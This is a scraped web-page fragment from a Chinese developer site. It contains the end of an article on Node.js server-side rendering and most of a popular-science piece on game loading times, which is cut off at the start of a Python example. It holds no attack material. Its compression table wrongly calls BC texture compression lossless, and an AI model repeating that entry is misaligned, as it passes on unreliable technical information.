                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在前后端分离架构流行的同时，服务端渲染（SSR）再次受到关注。SSR 可以在服务端生成完整 HTML 页面，再返回给浏览器，从而提升首屏加载速度和搜索引擎友好度。</p>
</blockquote>
<p>Node.js 作为 JavaScript 运行时，非常适合承担 SSR 渲染层的角色。本文将介绍 SSR 的核心概念、应用场景以及在 Node.js 中的实践方式。</p>
<hr/>
<h2 data-id="heading-0">一、什么是 SSR 服务端渲染</h2>
<p>SSR 是指页面内容在服务端完成渲染。</p>
<p>服务端接收到请求后，生成完整的 HTML 页面，并将其返回给客户端，浏览器只负责展示内容和执行必要的交互脚本。</p>
<p>与之对应的是 CSR（客户端渲染），页面内容主要由浏览器通过 JavaScript 动态生成。</p>
<hr/>
<h2 data-id="heading-1">二、为什么需要 SSR</h2>
<p>在某些场景下，纯客户端渲染存在明显不足。</p>
<p>例如：</p>
<ul>
<li>首屏加载速度慢</li>
<li>SEO 不友好</li>
<li>弱网环境体验差</li>
</ul>
<p>SSR 能够在页面加载时直接返回完整内容，从而改善这些问题。</p>
<hr/>
<h2 data-id="heading-2">三、Node.js 在 SSR 中的角色</h2>
<p>Node.js 通常作为 SSR 的运行环境。</p>
<p>它负责：</p>
<ul>
<li>接收 HTTP 请求</li>
<li>获取业务数据</li>
<li>执行前端渲染逻辑</li>
<li>返回 HTML</li>
</ul>
<p>由于 Node.js 与前端框架使用同一种语言，代码复用成本较低。</p>
<hr/>
<h2 data-id="heading-3">四、SSR 的基本渲染流程</h2>
<p>一个典型的 SSR 流程如下：</p>
<ol>
<li>浏览器发起请求</li>
<li>Node.js 服务接收请求</li>
<li>获取页面所需数据</li>
<li>生成 HTML 字符串</li>
<li>返回给浏览器</li>
</ol>
<p>浏览器在加载完成后，再接管页面交互逻辑。</p>
<hr/>
<h2 data-id="heading-4">五、Node.js + React 的 SSR 思路</h2>
<p>在 React 中，SSR 通常通过服务端渲染组件完成。</p>
<p>Node.js 调用渲染方法，将组件转换为 HTML 字符串，并注入到模板中。</p>
<p>这种方式可以在不牺牲交互能力的前提下，提高首屏性能。</p>
<hr/>
<h2 data-id="heading-5">六、Node.js + Vue 的 SSR 思路</h2>
<p>Vue 提供了完整的 SSR 解决方案。</p>
<p>Node.js 负责创建渲染上下文，Vue 在服务端生成页面结构，客户端再进行激活。</p>
<p>这种模式在中大型项目中应用广泛。</p>
<hr/>
<h2 data-id="heading-6">七、Node.js + Angular 的 SSR 思路</h2>
<p>Angular 通过 Universal 实现服务端渲染。</p>
<p>Node.js 通常作为中间层，负责启动渲染服务并处理请求。</p>
<p>该方案更适合对 SEO 和性能要求较高的企业级应用。</p>
<hr/>
<h2 data-id="heading-7">八、SSR 与 CSR 的混合模式</h2>
<p>在实际项目中，SSR 通常不会完全替代 CSR。</p>
<p>常见做法是：</p>
<ul>
<li>首屏使用 SSR</li>
<li>后续交互由客户端接管</li>
</ul>
<p>这种方式在性能和开发效率之间取得平衡。</p>
<hr/>
<h2 data-id="heading-8">九、SSR 带来的挑战</h2>
<p>SSR 也会引入一些额外复杂度。</p>
<p>例如：</p>
<ul>
<li>服务端压力增加</li>
<li>构建流程更复杂</li>
<li>状态同步问题</li>
</ul>
<p>因此，并不是所有项目都适合 SSR。</p>
<hr/>
<h2 data-id="heading-9">十、何时应该选择 SSR</h2>
<p>以下场景更适合使用 SSR：</p>
<ul>
<li>内容型网站</li>
<li>对 SEO 要求高的项目</li>
<li>首屏体验要求高</li>
</ul>
<p>而后台系统或内部工具，通常不需要 SSR。</p>
<hr/>
<h2 data-id="heading-10">十一、部署与运维注意事项</h2>
<p>SSR 服务本质上是 Node.js 服务。</p>
<p>部署时需要关注：</p>
<ul>
<li>服务器资源配置</li>
<li>并发处理能力</li>
<li>缓存策略</li>
</ul>
<p>合理使用缓存可以显著降低渲染压力。</p>
<hr/>
<h2 data-id="heading-11">十二、总结</h2>
<p>SSR 是前后端结合的一种重要实践方式。借助 Node.js，可以高效地将前端框架运行在服务端，从而获得更好的性能和搜索引擎表现。</p>
<p>在《Node.js 编程实战》中，理解 SSR 的原理和适用场景，有助于在复杂项目中做出正确的技术选型。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么游戏需要"加载时间"？——从硬盘读取到内存渲染]]></title>    <link>https://juejin.cn/post/7591942733366001698</link>    <guid>https://juejin.cn/post/7591942733366001698</guid>    <pubDate>2026-01-06T08:45:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733366001698" data-draft-id="7591882877312122932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么游戏需要&quot;加载时间&quot;？——从硬盘读取到内存渲染"/> <meta itemprop="keywords" content="后端,程序员"/> <meta itemprop="datePublished" content="2026-01-06T08:45:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无限大6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么游戏需要"加载时间"？——从硬盘读取到内存渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无限大6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:45:15.000Z" title="Tue Jan 06 2026 08:45:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🎮 为什么游戏需要"加载时间"？——从硬盘读取到内存渲染 💾</h2>
<blockquote>
<p>大家好，我是无限大，欢迎收看十万个为什么系列文章</p>
<p>希望今天的内容能对大家有所帮助</p>
</blockquote>
<p>想象一下：你迫不及待地打开新买的3A大作，点击"开始游戏"，然后……看着屏幕上的加载圈圈转啊转，转啊转，转了整整一分钟！😫</p>
<p>这时候你可能会想：为什么游戏需要加载？不能一点开就玩吗？</p>
<p>今天咱们就来聊聊游戏"加载时间"背后的秘密！</p>
<h3 data-id="heading-1">🤔 核心问题：游戏加载过程发生了什么？如何减少加载时间？</h3>
<p>很多人觉得"加载"就是"读条"，其实加载是一个<strong>超级复杂的过程</strong>——游戏要把存储在硬盘里的各种"零件"搬运到内存里，然后组装成一个完整的游戏世界！</p>
<h4 data-id="heading-2">游戏加载的"四大件"</h4>
<ul>
<li>🎮 <strong>游戏引擎</strong>：游戏的"大脑"，负责游戏逻辑和渲染</li>
<li>🖼️ <strong>贴图资源</strong>：游戏的"皮肤"，包括角色、场景、物品的纹理</li>
<li>🔊 <strong>音频资源</strong>：游戏的"声音"，包括音乐、语音、音效</li>
<li>📊 <strong>游戏数据</strong>：游戏的"记忆"，包括地图、NPC、AI行为</li>
</ul>
<h4 data-id="heading-3">为什么加载这么慢？</h4>
<ul>
<li>💾 <strong>硬盘速度</strong>：机械硬盘（HDD）读取速度慢，SSD快得多</li>
<li>📦 <strong>资源大小</strong>：现代游戏的资源越来越大（几十GB甚至上百GB）</li>
<li>🔄 <strong>加载顺序</strong>：有些资源必须按顺序加载，不能并行</li>
<li>🧩 <strong>资源依赖</strong>：有些资源需要先加载其他资源才能加载</li>
</ul>
<h3 data-id="heading-4">📜 从"卡带"到"SSD"：游戏加载的进化史</h3>
<h4 data-id="heading-5">1. 🎰 早期卡带时代："小而美"</h4>
<p>1980-1990年代，游戏主要存储在<strong>卡带</strong>里，直接集成在游戏机中。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>卡带容量小（通常只有几MB）</li>
<li>游戏数据直接"固化"在硬件中</li>
<li>几乎没有加载时间，一按开机就能玩</li>
<li>受限的图形和声音效果</li>
</ul>
<p><strong>代表游戏</strong>：超级马里奥、魂斗罗、塞尔达传说</p>
<p><strong>技术限制</strong>：</p>
<ul>
<li>卡带容量有限，无法存储高分辨率贴图</li>
<li>只能使用简单的PCM音频，不能播放CD音质音乐</li>
<li>游戏关卡设计受限，需要反复利用同一场景</li>
</ul>
<h4 data-id="heading-6">2. 💿 光盘时代："大而全"</h4>
<p>1990年代-2000年代，游戏进入了<strong>光盘时代</strong>，PS1、PS2、Xbox等主机都使用光盘作为存储介质。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>光盘容量大（CD 700MB，DVD 4.7GB）</li>
<li>需要将光盘数据读取到内存</li>
<li>加载时间明显增加（从几秒到几十秒）</li>
<li>出现了"过场加载"（进入新关卡前需要加载）</li>
</ul>
<p><strong>光盘的"痛"</strong>：</p>
<ul>
<li>🔄 读取速度慢（CD-ROM约1-2MB/s，DVD约3-5MB/s）</li>
<li>💿 光盘容易刮花，导致读取错误</li>
<li>🔇 噪音大（光驱转动的声音）</li>
<li>⏱️ 需要经常换盘（多碟游戏）</li>
</ul>
<p><strong>代表游戏</strong>：最终幻想系列、生化危机系列、侠盗猎车手系列</p>
<h4 data-id="heading-7">3. 💾 硬盘时代："持久存储"</h4>
<p>2000年代，随着游戏主机和PC都配备了<strong>硬盘</strong>，游戏加载速度得到了提升。</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>游戏数据可以安装到硬盘</li>
<li>从硬盘读取比从光盘快得多</li>
<li>支持存档和进度保存</li>
<li>可以进行"碎片整理"优化读取速度</li>
</ul>
<p><strong>硬盘的优势</strong>：</p>
<ul>
<li>🚀 读取速度快（HDD约50-150MB/s）</li>
<li>💾 容量大（早期几十GB，现在几TB）</li>
<li>🔇 静音（没有光驱的噪音）</li>
<li>📦 可靠性高（不易损坏）</li>
</ul>
<p><strong>代表游戏</strong>：使命召唤系列、刺客信条系列、上古卷轴系列</p>
<h4 data-id="heading-8">4. ⚡ SSD时代："飞速加载"</h4>
<p>2010年代，<strong>固态硬盘（SSD）</strong> 开始普及，彻底改变了游戏加载体验！</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>SSD读取速度是HDD的5-10倍</li>
<li>游戏加载时间大幅缩短</li>
<li>支持"即时"切换场景</li>
<li>出现了"无缝开放世界"</li>
</ul>
<p><strong>SSD的"魔法"</strong>：</p>
<ul>
<li>🚀 读取速度可达500-7000MB/s（NVMe SSD）</li>
<li>⏱️ 随机读取性能极佳（加载小文件快）</li>
<li>🔇 完全静音</li>
<li>📦 体积小、功耗低</li>
</ul>
<p><strong>代表游戏</strong>：最终幻想7重制版、漫威蜘蛛侠、赛博朋克2077</p>
<h4 data-id="heading-9">5. 🔮 云游戏时代："无需下载"</h4>
<p>2020年代，<strong>云游戏</strong>开始兴起，游戏直接在云端运行，流式传输到玩家设备！</p>
<p><strong>加载特点</strong>：</p>
<ul>
<li>无需下载和安装游戏</li>
<li>即点即玩</li>
<li>依赖网络带宽和延迟</li>
<li>游戏运行在云端服务器</li>
</ul>
<p><strong>云游戏的挑战</strong>：</p>
<ul>
<li>📶 需要稳定的网络连接</li>
<li>⏱️ 网络延迟会影响游戏体验</li>
<li>💰 服务器成本高</li>
<li>🎮 画质受网络带宽限制</li>
</ul>
<p><strong>代表平台</strong>：Google Stadia、微软xCloud、 NVIDIA GeForce NOW</p>
<h3 data-id="heading-10">🔧 技术原理：游戏加载的"秘密武器"</h3>
<h4 data-id="heading-11">1. 📦 游戏资源加载流程："搬家记"</h4>
<p>游戏加载就像<strong>从仓库往新家搬东西</strong>，需要经历以下几个步骤：</p>
<p><strong>步骤1：读取存储介质</strong></p>
<ul>
<li>从硬盘/光盘/网络读取游戏数据</li>
<li>不同的存储介质，读取速度差异巨大</li>
<li>数据读取后会被临时存放在"内存缓冲区"</li>
</ul>
<p><strong>步骤2：数据解压</strong></p>
<ul>
<li>游戏资源通常会被压缩存储（节省空间）</li>
<li>加载时需要解压（消耗CPU资源）</li>
<li>常见的压缩格式：ZIP、RAR、LZ4、ZSTD</li>
</ul>
<p><strong>步骤3：资源解析</strong></p>
<ul>
<li>将原始数据转换为游戏可以使用的格式</li>
<li>贴图数据转换为GPU纹理</li>
<li>模型数据转换为顶点缓冲</li>
<li>音频数据转换为采样缓冲</li>
</ul>
<p><strong>步骤4：资源上传GPU</strong></p>
<ul>
<li>将解析后的资源上传到显存</li>
<li>这是加载过程中最耗时的步骤之一</li>
<li>PCI Express 4.0/5.0大幅提升了传输速度</li>
</ul>
<p><strong>步骤5：初始化游戏对象</strong></p>
<ul>
<li>根据加载的资源创建游戏对象</li>
<li>初始化场景、角色、NPC</li>
<li>建立对象之间的关联关系</li>
</ul>
<h4 data-id="heading-12">2. 🎯 预加载技术："未雨绸缪"</h4>
<p>聪明的游戏开发者会使用<strong>预加载技术</strong>，提前加载可能需要的资源，减少游戏过程中的等待！</p>
<p><strong>按需预加载</strong></p>
<ul>
<li>根据玩家行为预测下一步操作</li>
<li>提前加载相关资源</li>
<li>比如：玩家靠近门口时，提前加载门后的场景</li>
</ul>
<p><strong>后台预加载</strong></p>
<ul>
<li>利用游戏运行时的"空闲时间"加载资源</li>
<li>比如：过场动画播放时，后台加载下一场景</li>
<li>玩家几乎感觉不到加载过程</li>
</ul>
<p><strong>层级化加载</strong></p>
<ul>
<li>将资源分为多个优先级</li>
<li>高优先级资源先加载（保证游戏可玩性）</li>
<li>低优先级资源后加载（优化体验）</li>
</ul>
<p><strong>异步加载</strong></p>
<ul>
<li>不阻塞游戏主线程</li>
<li>加载过程在后台进行</li>
<li>玩家可以继续进行游戏操作</li>
</ul>
<h4 data-id="heading-13">3. 🗜️ 资源压缩技术："空间换时间"</h4>
<p>游戏资源通常很大，需要通过<strong>压缩技术</strong>来节省存储空间！</p>
<p><strong>常见的游戏资源压缩格式</strong></p>









































<table><thead><tr><th>压缩格式</th><th>适用资源</th><th>压缩率</th><th>解压速度</th></tr></thead><tbody><tr><td>ZIP</td><td>通用压缩</td><td>中等</td><td>快</td></tr><tr><td>LZ4</td><td>贴图、模型</td><td>中等</td><td>很快</td></tr><tr><td>ZSTD</td><td>贴图、模型</td><td>高</td><td>快</td></tr><tr><td>Oodle</td><td>贴图、模型</td><td>很高</td><td>很快</td></tr><tr><td>BC</td><td>GPU纹理</td><td>无损</td><td>极快</td></tr></tbody></table>
<p><strong>纹理压缩格式</strong>（专门针对GPU优化）</p>
<ul>
<li><strong>DXT/BC</strong>：DirectX纹理压缩</li>
<li><strong>ETC</strong>：爱立信纹理压缩（移动端）</li>
<li><strong>ASTC</strong>：自适应可扩展纹理压缩（移动端）</li>
</ul>
<p><strong>音频压缩格式</strong></p>
<ul>
<li><strong>MP3</strong>：有损压缩，文件小</li>
<li><strong>AAC</strong>：高级音频编码，苹果常用</li>
<li><strong>WAV</strong>：无损格式，文件大</li>
<li><strong>OGG</strong>：开源音频格式</li>
</ul>
<h4 data-id="heading-14">4. 🧠 内存管理技术："精打细算"</h4>
<p>游戏内存是有限的，需要<strong>精细的内存管理</strong>！</p>
<p><strong>资源池技术</strong></p>
<ul>
<li>预先分配一块内存池</li>
<li>重复利用已释放的资源</li>
<li>减少内存分配和释放的开销</li>
</ul>
<p><strong>资源引用计数</strong></p>
<ul>
<li>记录每个资源被引用的次数</li>
<li>引用计数为0时，可以安全释放</li>
<li>防止内存泄漏</li>
</ul>
<p><strong>分页和换出</strong></p>
<ul>
<li>将不常用的资源换出到硬盘</li>
<li>需要时再换入内存</li>
<li>类似于操作系统的虚拟内存</li>
</ul>
<p><strong>内存池碎片整理</strong></p>
<ul>
<li>定期整理内存池</li>
<li>合并空闲内存块</li>
<li>防止内存碎片化</li>
</ul>
<h3 data-id="heading-15">💻 代码实例：游戏加载模拟器</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span>
<span class="hljs-keyword">import</span> os

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameResource</span>:
